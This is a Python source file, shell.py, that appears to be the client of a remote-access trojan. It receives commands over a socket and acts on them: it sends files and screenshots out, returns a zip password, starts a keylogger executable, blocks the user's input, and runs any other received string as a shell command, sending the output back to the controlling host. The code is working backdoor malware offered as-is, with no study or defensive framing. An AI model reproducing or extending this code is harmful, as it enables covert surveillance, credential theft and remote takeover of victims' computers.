#! /usr/bin/env python
##
#\file shell.py
#
#\brief The shell to run incoming commands
#
#\author Elephant Bomb
#
#\date 2016-04-24
from incomingFile import incomingFile
from openZip import openZip
from screenShot import screenShot
from sendToServer import sendToServer
import subprocess
import sys

def runShell(socketHolder):
	data = socketHolder.recv(1024)
	if data:
		print data
		if data == "SENDFILE":
			incomingFile(socketHolder)
		elif data == "ECHO":
			socketHolder.send("ECHO")
		elif data == "RECOVERFILE":
			fileName = "client_screen.png"
			sendToServer(fileName, socketHolder)
		elif data == "SCREENSHOT":
			screenShot()
		elif data == "OPENZIP":
			password = openZip()
			if not password:
				password = None
				password = "No password"
				socketHolder.send(password)
			else:
				socketHolder.send(password)
		elif data == "EXIT":
			socketHolder.close()
			sys.exit(0)
		elif data == "LOGKEYSON":
			process = subprocess.Popen(['logKeys.exe'])
			socketHolder.send('Logger started')
		elif data == 'BLOCKINPUT':
			process = subprocess.Popen(['blockInput.exe'])
			socketHolder.send('Block Input started')
		elif len(data) == 0:
			return True
		else:
			proc = subprocess.Popen(data, shell=True,
				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			socketHolder.send(stdout_value)
			return False
	else:
		print 'Lost connection to host. Will attempt to reconnect.'
		socketHolder = connect((HOST,PORT))